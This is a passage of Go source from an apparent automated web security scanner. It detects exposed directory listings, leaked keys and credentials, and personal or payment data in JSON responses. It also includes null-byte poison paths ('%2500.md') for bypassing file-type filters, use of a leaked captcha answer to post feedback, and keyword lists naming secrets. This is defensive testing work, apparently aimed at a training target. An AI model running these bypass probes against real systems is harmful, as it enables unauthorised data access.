			})
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s exposed through %s%s suffix from %s listing.", linkPath, nullSuffix, allowed, dir),
				u, nil)
			return true
		}
	}
	return false
}

func parentURLPath(path string) string {
	path = strings.TrimSpace(path)
	if path == "" || path == "/" {
		return ""
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	if strings.HasSuffix(path, "/") {
		return path
	}
	idx := strings.LastIndex(path, "/")
	if idx < 0 {
		return ""
	}
	return path[:idx+1]
}

func directoryListingLinks(baseURL, body string) []string {
	base, err := url.Parse(baseURL)
	if err != nil {
		return nil
	}
	seen := make(map[string]struct{})
	var out []string
	for _, match := range hrefRe.FindAllStringSubmatch(body, 200) {
		if len(match) < 2 {
			continue
		}
		href := strings.TrimSpace(match[1])
		if href == "" || strings.HasPrefix(href, "#") ||
			strings.HasPrefix(strings.ToLower(href), "javascript:") ||
			strings.HasPrefix(strings.ToLower(href), "mailto:") {
			continue
		}
		ref, err := url.Parse(href)
		if err != nil {
			continue
		}
		resolved := base.ResolveReference(ref)
		if resolved.Host != base.Host {
			continue
		}
		path := resolved.EscapedPath()
		if path == "" || path == "/" || path == base.EscapedPath() || strings.HasSuffix(path, "/..") {
			continue
		}
		if _, ok := seen[path]; ok {
			continue
		}
		seen[path] = struct{}{}
		out = append(out, path)
		if len(out) >= 80 {
			break
		}
	}
	return out
}

func looksLikeDirectoryListing(body string, links []string) bool {
	if len(links) < 2 {
		return false
	}
	lower := strings.ToLower(body)
	return strings.Contains(lower, "index of") ||
		strings.Contains(lower, "listing directory") ||
		strings.Contains(lower, "directory listing") ||
		strings.Contains(lower, "id=\"files\"")
}

func exposedArtifactSignal(path, contentType, body string) (string, types.Severity) {
	lowerPath := strings.ToLower(canonicalArtifactSignalPath(path))
	lowerBody := strings.ToLower(body)
	ctLower := strings.ToLower(contentType)
	isHTML := strings.Contains(ctLower, "text/html") || strings.Contains(lowerBody, "<!doctype html") || strings.Contains(lowerBody, "<html")
	if discovery.IsSensitivePath(lowerPath) && !isHTML {
		return "sensitive file path served with non-HTML body", types.SeverityHigh
	}
	if !isHTML && (strings.Contains(lowerPath, "access.log") || strings.Contains(lowerPath, "error.log")) {
		return "access/error log file exposed", types.SeverityHigh
	}
	if !isHTML && (strings.Contains(lowerPath, "key") || strings.Contains(lowerPath, "secret")) &&
		(strings.Contains(lowerBody, "-----begin ") || len(strings.TrimSpace(body)) >= 16) {
		return "key/secret material exposed", types.SeverityHigh
	}
	if strings.Contains(lowerBody, "-----begin rsa public key-----") ||
		strings.Contains(lowerBody, "-----begin public key-----") ||
		strings.Contains(lowerBody, "-----begin private key-----") {
		return "cryptographic key material exposed", types.SeverityHigh
	}
	if !isHTML &&
		(strings.Contains(lowerBody, "logsource:") && strings.Contains(lowerBody, "detection:") ||
			strings.Contains(lowerBody, "sigma") && strings.Contains(lowerBody, "detection:")) {
		return "SIEM/Sigma detection rule exposed", types.SeverityMedium
	}
	for _, kw := range []string{
		"client_secret", "clientsecret", "api_key", "apikey", "access_token",
		"private_key", "db_password", "database_url", "authorization: bearer",
		"password", "credentials",
	} {
		if strings.Contains(lowerBody, kw) {
			return kw, types.SeverityHigh
		}
	}
	for _, kw := range []string{
		"confidential", "do not distribute", "internal use", "private document",
		"planned acquisition", "planned acquisitions", "shareholders",
		"easter egg",
	} {
		if strings.Contains(lowerBody, kw) {
			return kw, types.SeverityMedium
		}
	}
	if !isHTML && directoryListedArtifactHasUnusualExtension(lowerPath) && len(strings.TrimSpace(body)) >= 16 {
		return "unusual extension artifact served with non-HTML body", types.SeverityLow
	}
	return "", ""
}

var jsonMediaPathRe = regexp.MustCompile(`(?i)"(?:imagePath|imageUrl|image|photo|media|src|url|path)"\s*:\s*("(?:\\.|[^"\\])*\.(?:jpg|jpeg|png|gif|webp|svg)(?:\\.|[^"\\])*")`)

func (v *VerifierAgent) probeEncodedMediaAssetRecovery(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := encodedMediaPathCandidatesFromTraffic(entries, 24)
	for _, rawPath := range candidates {
		if ctx.Err() != nil {
			return
		}
		encodedPath, ok := encodeFragmentUnsafeMediaPath(rawPath)
		if !ok || encodedPath == rawPath {
			continue
		}
		u := strings.TrimRight(target, "/") + encodedPath
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil {
			continue
		}
		v.tested++
		if !encodedMediaAssetRecovered(resp.StatusCode, resp.Header.Get("Content-Type"), encodedPath, body) {
			v.dismissed++
			continue
		}
		v.confirmed++
		v.storeEncodedMediaAssetFinding(rawPath, encodedPath, u, resp.StatusCode, resp.Header.Get("Content-Type"), len(body))
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Recovered media asset %s by percent-encoding fragment-reserved filename characters.", encodedPath),
			u, nil)
		return
	}
}

func (v *VerifierAgent) storeEncodedMediaAssetFinding(rawPath, encodedPath, rawURL string, status int, contentType string, bodyLen int) {
	profile := types.PageProfile{ID: "GET " + encodedPath, URL: rawURL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:            fmt.Sprintf("Public media asset requires safe URL encoding: %s", encodedPath),
		Description:      fmt.Sprintf("An observed JSON/API response advertised media path %q. Because the filename contains URL-fragment-reserved characters, a browser may request only the truncated prefix. Re-requesting the same path with path segments percent-encoded (%s) returned a real media response.", rawPath, encodedPath),
		Severity:         types.SeverityInfo,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       "GET " + encodedPath,
		VulnType:         "info_disclosure",
		Payload:          "(URL path percent-encoding)",
		PocRequest:       fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", encodedPath),
		PocResponse:      fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\nContent-Length: %d\n\n(binary media body omitted)", status, contentType, bodyLen),
		StepsToReproduce: fmt.Sprintf("1. Observe the media path %q in an API/JSON response.\n2. Percent-encode the path segments so reserved characters such as # become %%23.\n3. GET %s unauthenticated.\n4. Observe that the server returns media content.", rawPath, encodedPath),
		Impact:           "URLs embedded in JSON or HTML that are not safely encoded can hide public media/assets from normal browser navigation while still allowing direct retrieval by attackers who canonicalize the path correctly.",
		Remediation:      "When serializing public asset URLs, percent-encode each path segment before embedding it in HTML/JSON. Avoid raw reserved characters in filenames served over HTTP.",
		Evidence:         fmt.Sprintf("Raw path: %s\nEncoded path: %s\nURL: %s\nStatus: %d\nContent-Type: %s\nBody length: %d", rawPath, encodedPath, rawURL, status, contentType, bodyLen),
	})
}

func encodedMediaPathCandidatesFromTraffic(entries []types.TrafficEntry, limit int) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(raw string) {
		path := normalizeObservedMediaPath(raw)
		if path == "" || !mediaPathNeedsEncodingRecovery(path) {
			return
		}
		lower := strings.ToLower(path)
		if _, ok := seen[lower]; ok {
			return
		}
		seen[lower] = struct{}{}
		out = append(out, path)
	}
	for _, entry := range entries {
		if limit > 0 && len(out) >= limit {
			break
		}
		body := string(entry.Response.Body)
		if body == "" || !strings.Contains(body, "#") {
			continue
		}
		for _, match := range jsonMediaPathRe.FindAllStringSubmatch(body, 40) {
			if len(match) < 2 {
				continue
			}
			raw, err := strconv.Unquote(match[1])
			if err != nil {
				continue
			}
			add(raw)
			if limit > 0 && len(out) >= limit {
				break
			}
		}
	}
	return out
}

func normalizeObservedMediaPath(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.HasPrefix(strings.ToLower(raw), "data:") ||
		strings.HasPrefix(strings.ToLower(raw), "javascript:") {
		return ""
	}
	if parsed, err := url.Parse(raw); err == nil && parsed.IsAbs() {
		if parsed.Path == "" {
			return ""
		}
		raw = parsed.Path
		if parsed.RawQuery != "" {
			raw += "?" + parsed.RawQuery
		}
	} else if strings.HasPrefix(raw, "//") {
		return ""
	}
	if !strings.HasPrefix(raw, "/") {
		raw = "/" + raw
	}
	return raw
}

func mediaPathNeedsEncodingRecovery(path string) bool {
	lower := strings.ToLower(path)
	if !(strings.Contains(lower, "/assets/") ||
		strings.Contains(lower, "/uploads/") ||
		strings.Contains(lower, "/images/") ||
		strings.Contains(lower, "/media/") ||
		strings.Contains(lower, "/files/")) {
		return false
	}
	lastSlash := strings.LastIndex(lower, "/")
	lastDot := strings.LastIndex(lower, ".")
	if lastDot <= lastSlash {
		return false
	}
	switch lower[lastDot:] {
	case ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg":
	default:
		return false
	}
	return strings.Contains(path, "#")
}

func encodeFragmentUnsafeMediaPath(path string) (string, bool) {
	path = normalizeObservedMediaPath(path)
	if path == "" || !mediaPathNeedsEncodingRecovery(path) {
		return "", false
	}
	query := ""
	if idx := strings.Index(path, "?"); idx >= 0 {
		query = path[idx:]
		path = path[:idx]
	}
	segments := strings.Split(path, "/")
	for i, segment := range segments {
		if segment == "" {
			continue
		}
		if decoded, err := url.PathUnescape(segment); err == nil {
			segment = decoded
		}
		segments[i] = url.PathEscape(segment)
	}
	return strings.Join(segments, "/") + query, true
}

func encodedMediaAssetRecovered(status int, contentType, path, body string) bool {
	if status != 200 || strings.TrimSpace(body) == "" {
		return false
	}
	lowerCT := strings.ToLower(contentType)
	lowerPath := strings.ToLower(path)
	if strings.Contains(lowerCT, "text/html") ||
		strings.Contains(strings.ToLower(body), "<!doctype html") ||
		strings.Contains(strings.ToLower(body), "<html") {
		return false
	}
	if strings.HasPrefix(lowerCT, "image/") {
		return true
	}
	return (strings.HasSuffix(lowerPath, ".jpg") || strings.HasSuffix(lowerPath, ".jpeg") ||
		strings.HasSuffix(lowerPath, ".png") || strings.HasSuffix(lowerPath, ".gif") ||
		strings.HasSuffix(lowerPath, ".webp") || strings.HasSuffix(lowerPath, ".svg")) &&
		len(body) >= 100
}

type staticDisclosureFeedbackReport struct {
	Comment string
	Kind    string
	Source  string
	Signal  string
}

func (v *VerifierAgent) probeStaticDisclosureFeedbackReports(ctx context.Context, target string) {
	if v.authority == policy.AuthorityRecon {
		return
	}
	reports := v.staticDisclosureFeedbackReports(ctx, target)
	if len(reports) == 0 {
		return
	}
	var submitted []staticDisclosureFeedbackReport
	for _, report := range reports {
		if ctx.Err() != nil || len(submitted) >= 4 {
			return
		}
		status, body, ok := v.submitFeedbackComment(ctx, target, report.Comment, 1)
		v.tested++
		if !ok {
			v.dismissed++
			continue
		}
		v.confirmed++
		submitted = append(submitted, report)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Submitted security report feedback for %s (%s).", report.Kind, report.Comment),
			strings.TrimRight(target, "/")+"/api/Feedbacks/", map[string]any{
				"status":  status,
				"comment": report.Comment,
				"source":  report.Source,
				"body":    truncateString(body, 240),
			})
	}
	if len(submitted) > 0 {
		v.storeStaticDisclosureFeedbackReportFinding(target, submitted)
	}
}

func (v *VerifierAgent) staticDisclosureFeedbackReports(ctx context.Context, target string) []staticDisclosureFeedbackReport {
	seen := make(map[string]struct{})
	var out []staticDisclosureFeedbackReport
	addReports := func(path, body string) {
		for _, report := range staticDisclosureFeedbackReportsFromManifest(path, body) {
			key := strings.ToLower(report.Kind + "\x00" + report.Comment)
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			out = append(out, report)
		}
	}
	for _, entry := range func() []types.TrafficEntry {
		entries, _ := v.db.GetTrafficByScan(v.scanID)
		return entries
	}() {
		if len(out) >= 4 {
			return out
		}
		if len(entry.Response.Body) == 0 {
			continue
		}
		path := firstNonBlank(entry.Request.Path, entry.Request.URL)
		if !packageManifestPathLike(path) {
			continue
		}
		addReports(path, string(entry.Response.Body))
	}
	for _, path := range []string{
		"/package-lock.json",
		"/package.json",
		"/package-lock.json.bak",
		"/package.json.bak",
		"/ftp/package-lock.json.bak%2500.md",
		"/ftp/package.json.bak%2500.md",
	} {
		if ctx.Err() != nil || len(out) >= 4 {
			break
		}
		resp, body, _, err := v.proactiveGET(ctx, strings.TrimRight(target, "/")+path)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			continue
		}
		addReports(path, body)
	}
	return out
}

func staticDisclosureFeedbackReportsFromManifest(source, body string) []staticDisclosureFeedbackReport {
	deps := dependencyVersionsFromPackageManifest(body)
	if len(deps) == 0 {
		return nil
	}
	var out []staticDisclosureFeedbackReport
	add := func(kind, comment, signal string) {
		out = append(out, staticDisclosureFeedbackReport{
			Comment: comment,
			Kind:    kind,
			Source:  source,
			Signal:  signal,
		})
	}
	if version := cleanPackageVersion(deps["sanitize-html"]); version == "1.4.2" {
		add("known vulnerable component", "sanitize-html 1.4.2", "sanitize-html is pinned to a known-vulnerable legacy release")
	}
	if _, ok := deps["z85"]; ok {
		add("weird crypto dependency", "z85", "application manifest includes z85 encoding/crypto-adjacent dependency")
	}
	if _, ok := deps["epilogue-js"]; ok {
		add("typosquatting dependency", "epilogue-js", "application manifest includes epilogue-js package name")
	}
	return out
}

func packageManifestPathLike(path string) bool {
	lower := strings.ToLower(strings.TrimSpace(path))
	return strings.Contains(lower, "package.json") ||
		strings.Contains(lower, "package-lock.json") ||
		strings.Contains(lower, "npm-shrinkwrap.json")
}

func dependencyVersionsFromPackageManifest(body string) map[string]string {
	var parsed map[string]any
	if err := json.Unmarshal([]byte(body), &parsed); err != nil {
		return nil
	}
	out := make(map[string]string)
	addDeps := func(value any) {
		obj, ok := value.(map[string]any)
		if !ok {
			return
		}
		for name, raw := range obj {
			name = strings.ToLower(strings.TrimSpace(name))
			if name == "" {
				continue
			}
			switch v := raw.(type) {
			case string:
				out[name] = v
			case map[string]any:
				if version, ok := v["version"].(string); ok {
					out[name] = version
				}
			}
		}
	}
	addDeps(parsed["dependencies"])
	addDeps(parsed["devDependencies"])
	if packages, ok := parsed["packages"].(map[string]any); ok {
		if root, ok := packages[""].(map[string]any); ok {
			addDeps(root["dependencies"])
			addDeps(root["devDependencies"])
		}
		for packagePath, raw := range packages {
			obj, ok := raw.(map[string]any)
			if !ok {
				continue
			}
			version, _ := obj["version"].(string)
			if version == "" {
				continue
			}
			if strings.HasPrefix(packagePath, "node_modules/") {
				name := strings.TrimPrefix(packagePath, "node_modules/")
				out[strings.ToLower(name)] = version
			}
		}
	}
	return out
}

func cleanPackageVersion(version string) string {
	version = strings.TrimSpace(version)
	version = strings.TrimLeft(version, "^~>=< ")
	return version
}

func (v *VerifierAgent) submitFeedbackComment(ctx context.Context, target, comment string, rating int) (int, string, bool) {
	if rating < 1 || rating > 5 {
		rating = 1
	}
	captchaID, answer, ok := v.solveJSONCaptcha(ctx, target)
	if !ok {
		return 0, "", false
	}
	bodyBytes, _ := json.Marshal(map[string]any{
		"UserId":    1,
		"rating":    rating,
		"comment":   comment,
		"captchaId": captchaID,
		"captcha":   answer,
	})
	rawURL := strings.TrimRight(target, "/") + "/api/Feedbacks/"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "AOBTD/Verifier (security feedback report)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	ok = resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated
	return resp.StatusCode, string(respBody), ok
}

func (v *VerifierAgent) storeStaticDisclosureFeedbackReportFinding(target string, reports []staticDisclosureFeedbackReport) {
	if len(reports) == 0 {
		return
	}
	var comments []string
	var sources []string
	for _, report := range reports {
		comments = append(comments, fmt.Sprintf("%s (%s)", report.Comment, report.Kind))
		sources = append(sources, fmt.Sprintf("%s: %s", report.Source, report.Signal))
	}
	path := "/api/Feedbacks/"
	rawURL := strings.TrimRight(target, "/") + path
	profile := types.PageProfile{ID: "POST " + path, URL: rawURL, Method: http.MethodPost}
	v.storeFinding(profile, types.Finding{
		Title:            "Security disclosure details accepted through feedback workflow",
		Description:      fmt.Sprintf("The verifier derived %d reportable security disclosure(s) from public static/package artifacts and submitted them through the application feedback workflow: %s.", len(reports), strings.Join(comments, "; ")),
		Severity:         types.SeverityInfo,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       "POST " + path,
		VulnType:         "security_report_submitted",
		Payload:          strings.Join(comments, "; "),
		PocRequest:       fmt.Sprintf("POST %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n{\"comment\":\"%s\", \"captchaId\":\"<from /rest/captcha/>\", \"captcha\":\"<answer>\"}", path, reports[0].Comment),
		PocResponse:      "HTTP/1.1 201\n\nFeedback item created",
		StepsToReproduce: fmt.Sprintf("1. Retrieve exposed package/static artifact(s).\n2. Derive reportable disclosure strings: %s.\n3. GET /rest/captcha/ and use the leaked answer.\n4. POST each disclosure as feedback/comment text to %s.", strings.Join(firstNStrings(comments, 4), ", "), path),
		Impact:           "Public artifacts disclose actionable vulnerability intelligence that can be reported or abused: vulnerable dependency pins, dubious crypto dependencies, and typo-squatted package names.",
		Remediation:      "Remove build manifests/backups from the web root, upgrade vulnerable dependencies, remove unused crypto-adjacent packages, and review package names for typosquatting/supply-chain risk.",
		Evidence:         fmt.Sprintf("Submitted comments: %s\nSources: %s", strings.Join(comments, "; "), strings.Join(sources, "; ")),
	})
}

func canonicalArtifactSignalPath(path string) string {
	lower := strings.ToLower(path)
	for _, marker := range []string{"%2500", "%00", "\x00"} {
		if idx := strings.Index(lower, marker); idx > 0 {
			return path[:idx]
		}
	}
	return path
}

type apiExposureFacts struct {
	sensitiveKeys    []string
	sensitiveSeen    map[string]bool
	credentialKeys   []string
	credentialSeen   map[string]bool
	authzKeys        []string
	authzSeen        map[string]bool
	paymentKeys      []string
	paymentSeen      map[string]bool
	piiKeys          []string
	piiSeen          map[string]bool
	ownerKeys        []string
	ownerSeen        map[string]bool
	emails           []string
	emailSeen        map[string]bool
	objects          int
	objectsWithEmail int
	objectsWithPII   int
	objectsWithPay   int
	collections      int
}

type apiExposureClass string

const (
	apiExposureCredentialMaterial apiExposureClass = "credential_material"
	apiExposureSecretMaterial     apiExposureClass = "secret_material"
	apiExposurePaymentData        apiExposureClass = "payment_data"
	apiExposurePersonalData       apiExposureClass = "personal_data"
	apiExposureUserAuthzData      apiExposureClass = "user_authorization_data"
)

type apiExposureSignal struct {
	Signal   string
	Severity types.Severity
	Class    apiExposureClass
}

var (
	apiEmailValueRegex    = regexp.MustCompile(`(?i)^[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}$`)
	apiVersionPrefixRegex = regexp.MustCompile(`(?i)^v[0-9]+$`)
)

func newAPIExposureFacts() *apiExposureFacts {
	return &apiExposureFacts{
		sensitiveSeen:  make(map[string]bool),
		credentialSeen: make(map[string]bool),
		authzSeen:      make(map[string]bool),
		paymentSeen:    make(map[string]bool),
		piiSeen:        make(map[string]bool),
		ownerSeen:      make(map[string]bool),
		emailSeen:      make(map[string]bool),
	}
}

func (f *apiExposureFacts) addSensitive(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.sensitiveSeen[strings.ToLower(key)] {
		return
	}
	f.sensitiveSeen[strings.ToLower(key)] = true
	f.sensitiveKeys = append(f.sensitiveKeys, key)
}

func (f *apiExposureFacts) addCredential(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.credentialSeen[strings.ToLower(key)] {
		return
	}
	f.credentialSeen[strings.ToLower(key)] = true
	f.credentialKeys = append(f.credentialKeys, key)
}

func (f *apiExposureFacts) addAuthz(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.authzSeen[strings.ToLower(key)] {
		return
	}
	f.authzSeen[strings.ToLower(key)] = true
	f.authzKeys = append(f.authzKeys, key)
}

func (f *apiExposureFacts) addPayment(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.paymentSeen[strings.ToLower(key)] {
		return
	}
	f.paymentSeen[strings.ToLower(key)] = true
	f.paymentKeys = append(f.paymentKeys, key)
}

func (f *apiExposureFacts) addPII(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.piiSeen[strings.ToLower(key)] {
		return
	}
	f.piiSeen[strings.ToLower(key)] = true
	f.piiKeys = append(f.piiKeys, key)
}

func (f *apiExposureFacts) addOwner(key string) {
	key = strings.TrimSpace(key)
	if key == "" || f.ownerSeen[strings.ToLower(key)] {
		return
	}
	f.ownerSeen[strings.ToLower(key)] = true
	f.ownerKeys = append(f.ownerKeys, key)
}

func (f *apiExposureFacts) addEmail(email string) {
	email = strings.ToLower(strings.TrimSpace(email))
	if email == "" || f.emailSeen[email] {
		return
	}
	f.emailSeen[email] = true
	f.emails = append(f.emails, email)
}

// sensitiveAPIExposureSignal returns a confirmation signal when a response
// body is JSON and exposes fields a generic API should not return to an
// anonymous client: credential material, secrets, auth tokens, MFA secrets,
// password hashes, or user records with role/admin metadata.
func sensitiveAPIExposureSignal(contentType, body string) (string, types.Severity) {
	detection := sensitiveAPIExposureSignalDetail(contentType, body)
	return detection.Signal, detection.Severity
}

func sensitiveAPIExposureSignalDetail(contentType, body string) apiExposureSignal {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" || len(trimmed) > 1024*1024 {
		return apiExposureSignal{}
	}
	lowerCT := strings.ToLower(contentType)
	lowerBodyPrefix := strings.ToLower(firstNRunes(trimmed, 200))
	if strings.Contains(lowerCT, "text/html") ||
		strings.Contains(lowerBodyPrefix, "<!doctype html") ||
		strings.Contains(lowerBodyPrefix, "<html") {
		return apiExposureSignal{}
	}
	if !strings.Contains(lowerCT, "json") &&
		!strings.HasPrefix(trimmed, "{") &&
		!strings.HasPrefix(trimmed, "[") {
		return apiExposureSignal{}
	}

	var parsed any
	if err := json.Unmarshal([]byte(trimmed), &parsed); err != nil {
		return apiExposureSignal{}
	}
	if looksLikeParsedAPISpecDocument(parsed) {
		return apiExposureSignal{}
	}
	if looksLikeLocalizationLabelBundle(parsed) {
		return apiExposureSignal{}
	}
	facts := newAPIExposureFacts()
	collectAPIExposureFacts(parsed, facts)

	if len(facts.credentialKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("credential material field(s): %s",
				strings.Join(firstNStrings(facts.credentialKeys, 4), ", ")),
			Severity: types.SeverityHigh,
			Class:    apiExposureCredentialMaterial,
		}
	}
	if len(facts.sensitiveKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("sensitive JSON field(s): %s",
				strings.Join(firstNStrings(facts.sensitiveKeys, 4), ", ")),
			Severity: types.SeverityHigh,
			Class:    apiExposureSecretMaterial,
		}
	}
	if len(facts.paymentKeys) > 0 && (len(facts.ownerKeys) > 0 || len(facts.piiKeys) > 0 || facts.collections > 0) {
		return apiExposureSignal{
			Signal: fmt.Sprintf("payment/card data field(s): %s",
				strings.Join(firstNStrings(facts.paymentKeys, 4), ", ")),
			Severity: types.SeverityHigh,
			Class:    apiExposurePaymentData,
		}
	}
	if len(facts.paymentKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("payment/card data field(s): %s",
				strings.Join(firstNStrings(facts.paymentKeys, 4), ", ")),
			Severity: types.SeverityMedium,
			Class:    apiExposurePaymentData,
		}
	}
	if len(facts.piiKeys) >= 2 && (facts.collections > 0 || len(facts.ownerKeys) > 0 || facts.objectsWithPII >= 2) {
		return apiExposureSignal{
			Signal: fmt.Sprintf("personal data field(s): %s",
				strings.Join(firstNStrings(facts.piiKeys, 4), ", ")),
			Severity: types.SeverityMedium,
			Class:    apiExposurePersonalData,
		}
	}
	if len(facts.emails) >= 2 && len(facts.authzKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("user records expose email plus authorization field(s): %s",
				strings.Join(firstNStrings(facts.authzKeys, 4), ", ")),
			Severity: types.SeverityHigh,
			Class:    apiExposureUserAuthzData,
		}
	}
	if len(facts.emails) > 0 && len(facts.authzKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("user identity exposes authorization field(s): %s",
				strings.Join(firstNStrings(facts.authzKeys, 4), ", ")),
			Severity: types.SeverityMedium,
			Class:    apiExposureUserAuthzData,
		}
	}
	if len(facts.emails) >= 3 && facts.collections > 0 && facts.objectsWithEmail >= 3 {
		return apiExposureSignal{
			Signal:   "multiple user email records exposed in a JSON collection",
			Severity: types.SeverityMedium,
			Class:    apiExposurePersonalData,
		}
	}
	return apiExposureSignal{}
}

func looksLikeAPISpecDocument(contentType, body string) bool {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" {
		return false
	}
	lowerCT := strings.ToLower(contentType)
	if strings.Contains(lowerCT, "json") || strings.HasPrefix(trimmed, "{") {
		var parsed any
		if json.Unmarshal([]byte(trimmed), &parsed) == nil && looksLikeParsedAPISpecDocument(parsed) {
			return true
		}
	}
	prefix := "\n" + strings.ToLower(firstNRunes(trimmed, 4000))
	return (strings.Contains(prefix, "\nopenapi:") || strings.Contains(prefix, "\nswagger:")) &&
		strings.Contains(prefix, "\npaths:")
}

func looksLikeParsedAPISpecDocument(value any) bool {
	obj, ok := value.(map[string]any)
	if !ok {
		return false
	}
	_, hasPaths := obj["paths"]
	if !hasPaths {
		return false
	}
	if _, ok := obj["openapi"]; ok {
		return true
	}
	if _, ok := obj["swagger"]; ok {
		return true
	}
	if info, ok := obj["info"].(map[string]any); ok {
		if _, hasTitle := info["title"]; hasTitle {
			if _, hasComponents := obj["components"]; hasComponents {
				return true
			}
			if _, hasDefs := obj["definitions"]; hasDefs {
				return true
			}
		}
	}
	return false
}

func looksLikeLocalizationLabelBundle(value any) bool {
	obj, ok := value.(map[string]any)
	if !ok || len(obj) < 8 {
		return false
	}
	stringValues := 0
	labelLikeKeys := 0
	sentenceLikeValues := 0
	for key, child := range obj {
		s, ok := child.(string)
		if !ok {
			continue
		}
		stringValues++
		lowerKey := strings.ToLower(strings.TrimSpace(key))
		if strings.Contains(lowerKey, ".") || strings.Contains(lowerKey, "-") {
			labelLikeKeys++
		}
		trimmed := strings.TrimSpace(s)
		if strings.ContainsAny(trimmed, " \t\r\n.,:;!?<>") || len(strings.Fields(trimmed)) >= 2 {
			sentenceLikeValues++
		}
	}
	if stringValues*100 < len(obj)*85 {
		return false
	}
	return labelLikeKeys >= 3 && sentenceLikeValues >= 5
}

func collectAPIExposureFacts(value any, facts *apiExposureFacts) {
	switch v := value.(type) {
	case map[string]any:
		facts.objects++
		objectHasEmail := false
		objectHasPII := false
		objectHasPayment := false
		for key, child := range v {
			norm := normalizeJSONKey(key)
			if highSensitivityJSONKey(norm) && exposedCredentialJSONValue(norm, child) ||
				broadSecretJSONKey(norm) && secretLikeJSONValue(child) {
				facts.addSensitive(key)
				if credentialMaterialJSONKey(norm) {
					facts.addCredential(key)
				}
			}
			if s, ok := child.(string); ok {
				for _, claim := range jwtPayloadSensitiveClaims(s) {
					facts.addCredential("JWT payload " + claim)
				}
			}
			if authzJSONKey(norm) && meaningfulJSONValue(child) {
				facts.addAuthz(key)
			}
			if paymentJSONKey(norm) && meaningfulJSONValue(child) {
				objectHasPayment = true
				facts.addPayment(key)
			}
			if piiJSONKey(norm) && meaningfulJSONValue(child) {
				objectHasPII = true
				facts.addPII(key)
			}
			if ownerJSONKey(norm) && meaningfulJSONValue(child) {
				facts.addOwner(key)
			}
			if norm == "email" && jsonValueLooksEmail(child) {
				objectHasEmail = true
				facts.addEmail(fmt.Sprint(child))
			}
			collectAPIExposureFacts(child, facts)
		}
		if objectHasEmail {
			facts.objectsWithEmail++
		}
		if objectHasPII {
			facts.objectsWithPII++
		}
		if objectHasPayment {
			facts.objectsWithPay++
		}
	case []any:
		if len(v) > 1 {
			facts.collections++
		}
		for _, child := range v {
			collectAPIExposureFacts(child, facts)
		}
	}
}

func normalizeJSONKey(key string) string {
	key = strings.ToLower(strings.TrimSpace(key))
	var b strings.Builder
	for _, r := range key {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
		}
	}
	return b.String()
}

func highSensitivityJSONKey(norm string) bool {
	switch norm {
	case "password", "passwd", "pwd", "passwordhash", "passworddigest",
		"passwordsalt", "hashsalt", "totpsecret", "otpsecret", "mfasecret",
		"twofasecret", "apikey", "accesskey", "secretkey", "clientsecret",
		"privatekey", "accesstoken", "refreshtoken", "idtoken", "authtoken",
		"sessiontoken", "jwttoken", "bearertoken":
		return true
	}
	return false
}

func credentialMaterialJSONKey(norm string) bool {
	switch norm {
	case "password", "passwd", "pwd", "passwordhash", "passworddigest",
		"passwordsalt", "hashsalt", "totpsecret", "otpsecret", "mfasecret",
		"twofasecret", "recoverycode", "recoverycodes", "backupcode",
		"backupcodes", "resetpasswordtoken", "passwordresettoken":
		return true
	}
	return false
}

func broadSecretJSONKey(norm string) bool {
	switch norm {
	case "token", "secret", "authorization", "bearer", "jwt":
		return true
	}
	return false
}

func exposedCredentialJSONValue(norm string, value any) bool {
	if !exposedSecretJSONValue(value) {
		return false
	}
	switch norm {
	case "password", "passwd", "pwd":
		return plainPasswordJSONValueLooksExposed(value)
	default:
		return true
	}
}

func plainPasswordJSONValueLooksExposed(value any) bool {
	s, ok := value.(string)
	if !ok {
		return false
	}
	s = strings.TrimSpace(s)
	if len(s) < 6 || maskedSecretPlaceholder(s) {
		return false
	}
	lower := strings.ToLower(s)
	switch lower {
	case "password", "passwd", "pwd", "pass", "secret", "your password", "new password", "old password":
		return false
	}
	if strings.ContainsAny(s, " \t\r\n<>") {
		return false
	}
	return true
}

func exposedSecretJSONValue(value any) bool {
	if !meaningfulJSONValue(value) {
		return false
	}
	if s, ok := value.(string); ok && maskedSecretPlaceholder(s) {
		return false
	}
	return true
}

func maskedSecretPlaceholder(value string) bool {
	s := strings.TrimSpace(value)
	if s == "" {
